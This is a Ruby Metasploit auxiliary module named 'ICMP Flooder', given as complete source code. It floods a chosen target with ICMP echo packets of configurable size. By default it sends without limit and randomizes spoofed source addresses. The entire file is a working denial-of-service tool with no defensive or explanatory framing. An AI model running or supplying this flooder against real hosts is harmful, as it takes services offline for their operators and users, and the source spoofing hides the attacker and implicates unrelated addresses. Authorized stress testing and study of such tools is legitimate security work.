##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Dos
  include Msf::Exploit::Capture

  def initialize
    super(
      'Name' => 'ICMP Flooder',
      'Description' => 'A simple ICMP flooder',
      'Author' => 'Jesus Perez',
      'License'     => MSF_LICENSE,
      'Version' => '$Revision: 0 $'
    )

    register_options([
      OptAddress.new('SHOST', [false, 'The spoofable source address (else randomizes)']),
      OptInt.new('NUM', [false, 'Number of ping packets to send (else unlimited)']),
      OptInt.new('SIZE', [false, 'Size of ICMP packets to send (else 256 bytes)'])
    ])

    deregister_options('FILTER','PCAPFILE','SNAPLEN')
  end

  def srchost
    datastore['SHOST'] || [rand(0x100000000)].pack('N').unpack('C*').join('.')
  end

  def size
    datastore['SIZE'].to_i.zero? ? 256 : datastore['SIZE'].to_i
  end

  def run
    open_pcap

    sent = 0
    num = datastore['NUM'] || 0

    print_status("ICMP flooding #{rhost}...")

    p = PacketFu::ICMPPacket.new
    p.icmp_type = 8
    p.icmp_code = 0
    p.ip_daddr = rhost

    while (num <= 0) or (sent < num)
      p.ip_saddr = srchost
      p.payload = rand(36**size).to_s(36)
      p.recalc
      capture_sendto(p,rhost)
      sent += 1
    end

    close_pcap
  end
end